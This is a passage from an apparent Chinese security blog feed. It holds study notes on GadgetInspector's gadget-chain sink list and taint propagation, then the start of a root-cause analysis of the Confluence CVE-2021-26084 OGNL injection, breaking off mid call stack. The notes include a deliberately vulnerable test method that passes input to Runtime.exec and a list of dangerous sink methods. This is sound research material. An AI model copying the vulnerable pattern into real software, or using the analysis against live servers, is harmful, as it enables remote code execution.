alt="upload successful"></p><h4 id="2-5-2-sinks"><a href="#2-5-2-sinks" class="headerlink" title="2.5.2 sinks"></a>2.5.2 sinks</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">isSink</span><span class="params">(MethodReference.Handle method, <span class="keyword">int</span> argIndex, InheritanceMap inheritanceMap)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">&quot;java/io/FileInputStream&quot;</span>)</span><br><span class="line">            &amp;&amp; method.getName().equals(<span class="string">&quot;&lt;init&gt;&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">&quot;java/io/FileOutputStream&quot;</span>)</span><br><span class="line">            &amp;&amp; method.getName().equals(<span class="string">&quot;&lt;init&gt;&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">&quot;java/nio/file/Files&quot;</span>)</span><br><span class="line">        &amp;&amp; (method.getName().equals(<span class="string">&quot;newInputStream&quot;</span>)</span><br><span class="line">            || method.getName().equals(<span class="string">&quot;newOutputStream&quot;</span>)</span><br><span class="line">            || method.getName().equals(<span class="string">&quot;newBufferedReader&quot;</span>)</span><br><span class="line">            || method.getName().equals(<span class="string">&quot;newBufferedWriter&quot;</span>))) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">&quot;java/lang/Runtime&quot;</span>)</span><br><span class="line">            &amp;&amp; method.getName().equals(<span class="string">&quot;exec&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    if (method.getClassReference().getName().equals(&quot;java/lang/Class&quot;)</span></span><br><span class="line"><span class="comment">            &amp;&amp; method.getName().equals(&quot;forName&quot;)) &#123;</span></span><br><span class="line"><span class="comment">        return true;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    if (method.getClassReference().getName().equals(&quot;java/lang/Class&quot;)</span></span><br><span class="line"><span class="comment">            &amp;&amp; method.getName().equals(&quot;getMethod&quot;)) &#123;</span></span><br><span class="line"><span class="comment">        return true;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="comment">// If we can invoke an arbitrary method, that&#x27;s probably interesting (though this doesn&#x27;t assert that we</span></span><br><span class="line">    <span class="comment">// can control its arguments). Conversely, if we can control the arguments to an invocation but not what</span></span><br><span class="line">    <span class="comment">// method is being invoked, we don&#x27;t mark that as interesting.</span></span><br><span class="line">    <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">&quot;java/lang/reflect/Method&quot;</span>)</span><br><span class="line">            &amp;&amp; method.getName().equals(<span class="string">&quot;invoke&quot;</span>) &amp;&amp; argIndex == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">&quot;java/net/URLClassLoader&quot;</span>)</span><br><span class="line">            &amp;&amp; method.getName().equals(<span class="string">&quot;newInstance&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">&quot;java/lang/System&quot;</span>)</span><br><span class="line">            &amp;&amp; method.getName().equals(<span class="string">&quot;exit&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">&quot;java/lang/Shutdown&quot;</span>)</span><br><span class="line">            &amp;&amp; method.getName().equals(<span class="string">&quot;exit&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">&quot;java/lang/Runtime&quot;</span>)</span><br><span class="line">            &amp;&amp; method.getName().equals(<span class="string">&quot;exit&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">&quot;java/nio/file/Files&quot;</span>)</span><br><span class="line">            &amp;&amp; method.getName().equals(<span class="string">&quot;newOutputStream&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">&quot;java/lang/ProcessBuilder&quot;</span>)</span><br><span class="line">            &amp;&amp; method.getName().equals(<span class="string">&quot;&lt;init&gt;&quot;</span>) &amp;&amp; argIndex &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (inheritanceMap.isSubclassOf(method.getClassReference(), <span class="keyword">new</span> ClassReference.Handle(<span class="string">&quot;java/lang/ClassLoader&quot;</span>))</span><br><span class="line">            &amp;&amp; method.getName().equals(<span class="string">&quot;&lt;init&gt;&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">&quot;java/net/URL&quot;</span>) &amp;&amp; method.getName().equals(<span class="string">&quot;openStream&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Some groovy-specific sinks</span></span><br><span class="line">    <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">&quot;org/codehaus/groovy/runtime/InvokerHelper&quot;</span>)</span><br><span class="line">            &amp;&amp; method.getName().equals(<span class="string">&quot;invokeMethod&quot;</span>) &amp;&amp; argIndex == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (inheritanceMap.isSubclassOf(method.getClassReference(), <span class="keyword">new</span> ClassReference.Handle(<span class="string">&quot;groovy/lang/MetaClass&quot;</span>))</span><br><span class="line">            &amp;&amp; Arrays.asList(<span class="string">&quot;invokeMethod&quot;</span>, <span class="string">&quot;invokeConstructor&quot;</span>, <span class="string">&quot;invokeStaticMethod&quot;</span>).contains(method.getName())) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// This jython-specific sink effectively results in RCE</span></span><br><span class="line">    <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">&quot;org/python/core/PyCode&quot;</span>) &amp;&amp; method.getName().equals(<span class="string">&quot;call&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-5-3-Demo流程"><a href="#2-5-3-Demo流程" class="headerlink" title="2.5.3 Demo流程"></a>2.5.3 Demo流程</h4><p>还是借用Longofo师傅的图更直观<br><img src="/images/pasted-271.png" alt="upload successful"></p><h5 id="BSF流程"><a href="#BSF流程" class="headerlink" title="BSF流程"></a>BSF流程</h5><ol><li>source 进入methodsToExplore</li><li>处理source，查找source 相关的callgraph：source-cmed1，source-cmed2，source-cmed3。判断，source-cmed1非sink<ul><li>source-cmed1 add进入methodsToExplore 队尾</li><li>cmed1 进入exploredMethods白名单</li><li>cmed2，cmed3 类似</li></ul></li><li>处理source-cmed1，查找cmed1相关的callgraph：cmed1-cmed4， cmed1-cmed5，重复步骤2</li></ol><h5 id="传播流程"><a href="#传播流程" class="headerlink" title="传播流程"></a>传播流程</h5><ol><li>从source出发，source this可控，也即taintArg：0</li><li>callgraph中，取出source-method1 参数污染对应关系0-&gt;0，那么method1 的arg0被污染，也即taintArg：0</li><li>callgraph中，取出method1-method5 参数污染对应关系0-&gt;2，那么method5的taintArg：2</li><li>callgraph中，取出method5-sink 参数污染对应关系2-&gt;2，那么sink的taintArg：2，符合gadget，完成。</li></ol><h2 id="0x03-Pratise"><a href="#0x03-Pratise" class="headerlink" title="0x03 Pratise"></a>0x03 Pratise</h2><p>Longofo师傅有样例，加了些自己的测试代码，传到了Git上方便点。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/yangbh/GINote.git</span><br><span class="line"><span class="built_in">cd</span> GINote</span><br><span class="line">mvn package</span><br><span class="line">java -Xmx2G -jar build/libs/gadget-inspector-all.jar GILearn2-1.0-SNAPSHOT.jar</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-273.png" alt="upload successful"></p><h2 id="0x04-思考"><a href="#0x04-思考" class="headerlink" title="0x04 思考"></a>0x04 思考</h2><h3 id="4-1-callgraph-对静态方法的处理"><a href="#4-1-callgraph-对静态方法的处理" class="headerlink" title="4.1 callgraph 对静态方法的处理"></a>4.1 callgraph 对静态方法的处理</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invokeCall</span><span class="params">(Object arg)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> Runtime.getRuntime().exec((String)arg);</span><br><span class="line"><span class="comment">//        return Runtime.getRuntime().exec(String.ValueOf(arg));</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>su18师傅的文章更深刻，这里学完再来写吧。</p><h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p>只能算是学习GI的笔记，至少大致理清了GI的运行逻辑（对ASM还不是特别了解），过程中也发现师傅们提出的一些bug和改进点。</p><p>师傅们关于ASM那块都讲的很晦涩，希望能够帮助到同样对此有困惑的人。</p><h2 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h2><ul><li>[1] <a href="https://su18.org/post/gadgetor/#0x05-gadgetor">高效挖掘反序列化漏洞——GadgetInspector改造(by:su18)</a></li><li>[2] <a href="https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf">us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf (by:网飞 Platform Security Team)</a></li><li>[3] <a href="https://github.com/kezibei/Urldns">https://github.com/kezibei/Urldns(by:珂字辈)</a></li><li>[4] <a href="https://xz.aliyun.com/t/7058">java反序列化利用链自动挖掘工具gadgetinspector源码浅析(by:threedr3am)</a></li><li>[5] <a href="https://paper.seebug.org/1034/">Java 反序列化工具 gadgetinspector 初窥(by:Longofo)</a></li><li>[6] <a href="https://fynch3r.github.io/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/">GadgetInspector源码分析(by:fynch3r)</a><br>(<a href="https://www.anquanke.com/post/id/251814">https://www.anquanke.com/post/id/251814</a>)</li><li>[7] <a href="https://www.kingkk.com/2020/01/gadgetinspector%E6%BA%90%E7%A0%81%E6%B5%85%E6%9E%90/">gadgetinspector源码浅析(by:kingkk)</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;开始啃骨头了。。。&lt;/p&gt;
&lt;h2 id=&quot;0x01-背景知识&quot;&gt;&lt;a href=&quot;#0x01-背景知识&quot; class=&quot;headerlink&quot; title=&quot;0x01 背景知识&quot;&gt;&lt;/a&gt;0x01 背景知识&lt;/h2&gt;&lt;p&gt;不了解算法原理基础上，去直接啃GI源码，真的是一件很困难的事情，难得有师傅们的经验总结，站在师傅们的肩膀上记录下GI的学习心得。&lt;/p&gt;
&lt;h3 id=&quot;时间线&quot;&gt;&lt;a href=&quot;#时间线&quot; class=&quot;headerlink&quot; title=&quot;时间线&quot;&gt;&lt;/a&gt;时间线&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;2018年Black Hat公布&lt;a href=&quot;https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf&quot;&gt;GadgetInspector&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;2019年Longofo师傅&lt;a href=&quot;https://paper.seebug.org/1034/#step2-passthrough_1&quot;&gt;《Java 反序列化工具 gadgetinspector 初窥》&lt;/a&gt;，详细跟踪了除ASM之外的知识点，重点是逆拓扑排序&lt;/li&gt;
&lt;li&gt;2020年threedr3am&lt;a href=&quot;https://xz.aliyun.com/t/7058#toc-4&quot;&gt;《java反序列化利用链自动挖掘工具gadgetinspector源码浅析》&lt;/a&gt;，重点分析了Longofo师傅未提到的ASM&lt;/li&gt;
&lt;li&gt;2022年su18师傅&lt;a href=&quot;https://su18.org/post/gadgetor/&quot;&gt;《高效挖掘反序列化漏洞——GadgetInspector改造》&lt;/a&gt;，提到了GI的不足以及改进思路&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;当然，还有其他的许多师傅关于GI的文章，这里没有提到，不赘述。&lt;/p&gt;</summary>
    
    
    
    <category term="Java安全" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    <category term="程序分析" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/"/>
    
    
    <category term="Java" scheme="http://m0d9.me/tags/Java/"/>
    
    <category term="GadgetInspector" scheme="http://m0d9.me/tags/GadgetInspector/"/>
    
    <category term="污点分析" scheme="http://m0d9.me/tags/%E6%B1%A1%E7%82%B9%E5%88%86%E6%9E%90/"/>
    
    <category term="静态分析" scheme="http://m0d9.me/tags/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>Confluence CVE-2021-26084 Velocity模板二次注入</title>
    <link href="http://m0d9.me/2022/07/20/Struts2%E7%B3%BB%E5%88%97%E5%9B%9B%EF%BC%9AConfluence%20CVE-2021-26084/"/>
    <id>http://m0d9.me/2022/07/20/Struts2%E7%B3%BB%E5%88%97%E5%9B%9B%EF%BC%9AConfluence%20CVE-2021-26084/</id>
    <published>2022-07-20T08:27:00.000Z</published>
    <updated>2022-09-14T05:32:12.113Z</updated>
    
    <content type="html"><![CDATA[<p>Confluence CVE-2021-26084 是前台能够触发的RCE，CVSS9.8，危害不小。漏洞原因是因为Velocity 写得有问题导致可以Ognl注入，这种模板问题导致的漏洞挺少见，但是很适用，值得分析。</p><h2 id="0x01-环境搭建"><a href="#0x01-环境搭建" class="headerlink" title="0x01 环境搭建"></a>0x01 环境搭建</h2><p>P🐮的Vulhub 有镜像，参考【2】，同样调试接口没有开出来，可以参考之前的《Confluence CVE-2022-26134 OGNL 分析》一文搭建环境。</p><ol><li><p>新建Dockerfile</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> vulhub/confluence:<span class="number">7.4</span>.<span class="number">10</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> sed <span class="string">&quot;67 iCATALINA_OPTS=\&quot;-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5005 \$\&#123;CATALINA_OPTS\&#125;\&quot;&quot;</span> -i /opt/atlassian/confluence/bin/setenv.sh</span></span><br></pre></td></tr></table></figure></li><li><p>更新docker-compose.yml</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">build:</span> <span class="string">.</span></span><br><span class="line"><span class="attr">ports:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&quot;8090:8090&quot;</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&quot;5005:5005&quot;</span></span><br></pre></td></tr></table></figure></li></ol><a id="more"></a><h2 id="0x02-漏洞复现"><a href="#0x02-漏洞复现" class="headerlink" title="0x02 漏洞复现"></a>0x02 漏洞复现</h2><p>参考【1】中Lotso师傅给的几个patch</p><ol><li><p>confluence/users/user-dark-features.vm</p><p><code>value=&#39;$!action.featureKey&#39; =&gt; value=featureKey</code></p><p>7.12.4版本已经对该文件进行了更改</p></li><li><p>confluence/login.vm</p><p><code>value=&#39;$!action.token&#39; =&gt; value=token</code></p><p>7.12.4版本已经对该文件进行了更改</p></li><li><p>confluence/pages/createpage-entervariables.vm</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">value&#x3D;&#39;$!querystring&#39; &#x3D;&gt; value&#x3D;querystring</span><br><span class="line">value&#x3D;&#39;$linkCreation&#39; &#x3D;&gt; value&#x3D;linkCreation</span><br></pre></td></tr></table></figure></li><li><p>confluence/template/custom/content-editor.vm</p><p> 对多个input标签进行了value的替换，主要是将value中的$去掉</p><p> <code>&quot;Hidden&quot; &quot;name=&#39;linkCreation&#39;&quot; &quot;value=&#39;$isLinkCreation&#39;&quot; =&gt; &quot;Hidden&quot; &quot;name=&#39;linkCreation&#39;&quot; &quot;value=isLinkCreation&quot;</code></p></li><li><p>JAR文件的中templates/editor-preload-container.vm</p><p> <code>value=&#39;$!&#123;action.syncRev&#125;&#39; =&gt; value=syncRev</code></p></li></ol><p>以doenterpagevariables.action 为例</p><p><img src="/images/pasted-234.png" alt="upload successful"></p><h2 id="0x03-原理解析"><a href="#0x03-原理解析" class="headerlink" title="0x03 原理解析"></a>0x03 原理解析</h2><h3 id="3-1-doenterpagevariables-action-调用链跟踪"><a href="#3-1-doenterpagevariables-action-调用链跟踪" class="headerlink" title="3.1 doenterpagevariables.action 调用链跟踪"></a>3.1 doenterpagevariables.action 调用链跟踪</h3><p>顺着执行跟踪</p><h4 id="1-doenterpagevariables-action"><a href="#1-doenterpagevariables-action" class="headerlink" title="1. doenterpagevariables.action"></a>1. doenterpagevariables.action</h4><p>根据补丁消息，可以定位到createpage-entervariables.vm，对应action为doenterpagevariables</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;doenterpagevariables&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.atlassian.confluence.pages.actions.PageVariablesAction&quot;</span> <span class="attr">method</span>=<span class="string">&quot;doEnter&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;error&quot;</span> <span class="attr">type</span>=<span class="string">&quot;velocity&quot;</span>&gt;</span>/pages/createpage-entervariables.vm<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;input&quot;</span> <span class="attr">type</span>=<span class="string">&quot;velocity&quot;</span>&gt;</span>/pages/createpage-entervariables.vm<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;success&quot;</span> <span class="attr">type</span>=<span class="string">&quot;velocity&quot;</span>&gt;</span>/pages/createpage.vm<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="2-PageVariablesAction-doEnter"><a href="#2-PageVariablesAction-doEnter" class="headerlink" title="2. PageVariablesAction#doEnter"></a>2. PageVariablesAction#doEnter</h4><p>在PageVariablesAction#doEnter，debug打点发现未进入</p><p>此小结与整体跟踪无关，仅探讨为何未进入debug</p><p>struts2 执行流程如下，interceptors 一个个执行，如果哪一个返回了有效的result，则不会进入后续的流程了。<br><img src="/images/pasted-241.png" alt="upload successful"></p><p>执行到ConfluenceXsrfTokenInterceptor，返回了”input” result，直接进行了executeResult，因此避开了doEnter 方法。</p><p><img src="/images/pasted-242.png" alt="upload successful"></p><h4 id="3-返回-input，进行Velocity渲染-createpage-entervariables-vm"><a href="#3-返回-input，进行Velocity渲染-createpage-entervariables-vm" class="headerlink" title="3. 返回 input，进行Velocity渲染 createpage-entervariables.vm"></a>3. 返回 input，进行Velocity渲染 createpage-entervariables.vm</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;form name&#x3D;&quot;filltemplateform&quot; method&#x3D;&quot;POST&quot; action&#x3D;&quot;doenterpagevariables.action&quot;&gt;</span><br><span class="line">    #form_xsrfToken()</span><br><span class="line">    #tag (&quot;Hidden&quot; &quot;name&#x3D;&#39;queryString&#39;&quot; &quot;value&#x3D;&#39;$!queryString&#39;&quot;)</span><br><span class="line">    #tag (&quot;Hidden&quot; &quot;name&#x3D;&#39;templateId&#39;&quot; &quot;value&#x3D;&#39;$pageTemplate.id&#39;&quot;)</span><br></pre></td></tr></table></figure><h4 id="4-AbstractTagDirective-tag子语句"><a href="#4-AbstractTagDirective-tag子语句" class="headerlink" title="4. AbstractTagDirective tag子语句"></a>4. AbstractTagDirective tag子语句</h4><p>渲染Tag #tag (“Hidden” “name=’queryString’” “value=’$!queryString’”)</p><p>此刻Tag 有3个子节点</p><p><img src="/images/pasted-236.png" alt="upload successful"></p><h4 id="5-第三个子节点ASTStringLiteral"><a href="#5-第三个子节点ASTStringLiteral" class="headerlink" title="5. 第三个子节点ASTStringLiteral"></a>5. 第三个子节点ASTStringLiteral</h4><p>第三个子节点ASTStringLiteral#value</p><p>Velocity 一文中有单独介绍ASTStringLiteral 节点，不过这里稍为复杂点，interpolate为true，需要<br><code>this.nodeTree.render(context, writer);</code><br>其nodeTree 为ASTReference</p><h4 id="6-子节点ASTReference-getVariableValue"><a href="#6-子节点ASTReference-getVariableValue" class="headerlink" title="6. 子节点ASTReference#getVariableValue"></a>6. 子节点ASTReference#getVariableValue</h4><p>进过一些列的调用，最终到执行到getVariableValue 方法，功能为从context中获取value值</p><h5 id="6-1-InternalContextAdapterImpl-amp-WebWorkVelocityContext"><a href="#6-1-InternalContextAdapterImpl-amp-WebWorkVelocityContext" class="headerlink" title="6.1 InternalContextAdapterImpl &amp; WebWorkVelocityContext"></a>6.1 InternalContextAdapterImpl &amp; WebWorkVelocityContext</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">get</span><span class="params">(String key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.context.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>this.context 类为OutputAwareWebWorkVelocityContext<br>OutputAwareWebWorkVelocityContext extends WebWorkVelocityContext</p><p>WebWorkVelocityContext 在Velocity那一便文章中有讲到</p><p>会尝试从一下context中获取</p><ol><li>context</li><li>stack.findValue</li><li>chainedContexts</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">internalGet</span><span class="params">(String key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">super</span>.internalContainsKey(key)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.internalGet(key);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.stack != <span class="keyword">null</span>) &#123;</span><br><span class="line">            Object object = <span class="keyword">this</span>.stack.findValue(key);</span><br><span class="line">            <span class="keyword">if</span> (object != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> object;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.chainedContexts != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> index = <span class="number">0</span>; index &lt; <span class="keyword">this</span>.chainedContexts.length; ++index) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">this</span>.chainedContexts[index].containsKey(key)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">this</span>.chainedContexts[index].internalGet(key);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-237.png" alt="upload successful"></p><p><img src="/images/pasted-238.png" alt="upload successful"></p><h5 id="6-2-queryString-如何赋值的"><a href="#6-2-queryString-如何赋值的" class="headerlink" title="6.2 queryString 如何赋值的"></a>6.2 queryString 如何赋值的</h5><p>root 为PageVariablesAction，有个queryString 属性，此刻就是post参数。</p><p>那么是如何赋值的呢？</p><p>结论是在SafeParametersInterceptor 中赋值的</p><p><img src="/images/pasted-239.png" alt="upload successful"></p><p>最终时通过Ognl.setValue 进行赋值的</p><p>ASTProperty.setValueBody 经过一些列的调用，最终调用AbstractCreatePageAction.setQueryString 实现赋值，具体调用栈如下</p><p>完整的调用栈如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 